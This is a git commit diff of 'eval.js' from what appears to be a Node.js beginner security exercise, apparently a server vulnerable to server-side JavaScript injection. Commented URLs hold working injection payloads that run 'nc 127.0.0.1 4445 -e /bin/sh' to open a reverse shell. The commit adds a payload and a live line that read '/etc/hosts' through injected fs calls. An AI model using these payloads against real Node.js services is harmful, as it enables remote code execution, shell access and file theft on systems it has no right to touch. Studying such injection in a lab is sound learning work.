dcc13bb73ae86e76acb29fe5be33dc334f823a00
TEHWINSAM <me@tehwinsam.com>
2020-04-19 13:45:50 +0800

    Update eval.js

--- NodeJS Beginner Exercise/eval.js
+++ NodeJS Beginner Exercise/eval.js
@@ -9,10 +9,10 @@ app.get('/', function(req, res) {
 });
 app.listen(8000);
 
-
+require('fs').readFile('/etc/hosts', 'utf8', function (err,data) {   if (err) {    return console.log(err);  }  console.log(data);});
 
 //Payload
 //http://127.0.0.1:8000/?name=(123%3E%20122)%20|%20require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)
 //http://127.0.0.1:8000/?name=(123%3E%20124)%20|%20require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)
 //http://127.0.0.1:8000/?name=require(%22child_process%22).exec(%27nc%20127.0.0.1%204445%20-e%20/bin/sh%27)
-
+//http://127.0.0.1:8000/?name=%20(%27aaa%27)%20|%20require(%27fs%27).readFile(%27/etc/hosts%27,%20%27utf8%27,%20function%20(err,data)%20{%20%20%20if%20(err)%20{%20%20%20%20return%20console.log(err);%20%20}%20%20console.log(data);})
